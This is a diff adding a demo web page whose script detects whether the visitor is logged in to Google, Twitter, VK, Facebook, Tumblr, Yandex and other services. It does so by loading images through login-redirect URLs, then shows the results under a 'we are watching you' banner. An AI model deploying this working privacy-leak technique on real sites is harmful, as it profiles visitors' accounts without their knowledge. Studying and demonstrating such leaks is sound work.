@@ -1,0 +1,109 @@
+<!doctype html>
+<html class="no-js" lang="">
+  <head>
+    <link rel="stylesheet" href="css/bootstrap.css">
+    <link rel="stylesheet" href="css/font-awesome.min.css">
+    <link rel="stylesheet" href="css/main.css">
+
+    <link rel="apple-touch-icon" sizes="57x57" href="img/fav/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="img/fav/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="img/fav/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="img/fav/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="img/fav/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="img/fav/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="img/fav/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="img/fav/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="img/fav/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="img/fav/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="img/fav/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="img/fav/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="img/fav/favicon-16x16.png">
+    <link rel="manifest" href="img/fav/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="img/fav/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <meta http-equiv="content-type" content="text/html; charset=windows-1251">
+      <script>
+        var login = Object();
+
+        function login_status(a, b) {
+            div = document.createElement('div');
+        	if (b == 1){
+        		div.innerHTML = a + ': logged in';
+        		div.style.color = 'red';
+            div.className = 'container';
+            div.className = 'row centered';
+        	} else {
+        		div.innerHTML = a + ': not logged in';
+        		div.style.color = 'green';
+            div.className = 'container';
+            div.className = 'row centered';
+        	}
+        	document.body.appendChild(div);
+        };
+
+        function img(a, b) {
+            var i = new Image();
+            i.onload = function () {
+                login_status(b, 1);
+                i = i.onload = i.onerror = undefined
+            };
+            i.onerror = function () {
+                login_status(b, 0);
+                i = i.onload = i.onerror = undefined
+            };
+            i.src = a
+        };
+
+        <!-- img('https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png?' + Math.random(), 'google'); -->
+        img('https://plus.google.com/up/?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png&type=st&gpsrc=ogpy0&' + Math.random(), 'google plus');
+        img('https://twitter.com/login?redirect_after_login=%2Ffavicon.ico?' + Math.random(), 'twitter');
+        img('https://login.vk.com/?role=fast&to=ZmF2aWNvbi5pY28-&' + Math.random(), 'vk');
+        img('https://www.facebook.com/login.php?next=http%3A%2F%2Fwww.facebook.com%2Ffavicon.ico/?' + Math.random(), 'facebook');
+        img('https://accounts.google.com/ServiceLogin?service=youtube&continue=https://www.google.com/intl/en/images/logos/accounts_logo.png?' + Math.random(), 'youtube');
+        img('https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://www.google.com/intl/en/images/logos/accounts_logo.png?' + Math.random(), 'gmail');
+        img('https://www.tumblr.com/login?redirect_to=%2ffavicon.ico?' + Math.random(), 'tumblr');
+        img('https://mail.yandex.ru/?retpath=https://mail.yandex.ru/favicon.ico?' + Math.random(), 'yandex');
+      </script>
+  </head>
+  <body>
+    <div class="container">
+      <div class="row centered">
+        <h1>W3 R W@TCH1N9 U!!!11</h1>
+        <br><br><br>
+      </div>
+    </div>
+    <style media="screen">
+    @import url('https://fonts.googleapis.com/css?family=Comfortaa|Ubuntu');
+      h1
+      {
+        font-family: "Comfortaa";
+        font-weight: 300;
+        font-size: 70px;
+        color: #555;
+      }
+    </style>
+
+
+    <!--<div style="color: red;">
+      yandex: not logged in
+    </div>
+    <div style="color: red;">
+      vk: not logged in
+    </div>
+    <div style="color: green;">
+      facebook: not logged in
+    </div>
+    <div style="color: green;">
+      google plus: not logged in
+    </div>
+    <div style="color: green;">t
+      witter: not logged in
+    </div>
+    <div style="color: green;">
+      tumblr: not logged in
+    </div>-->
+  </body>
+
+</html>
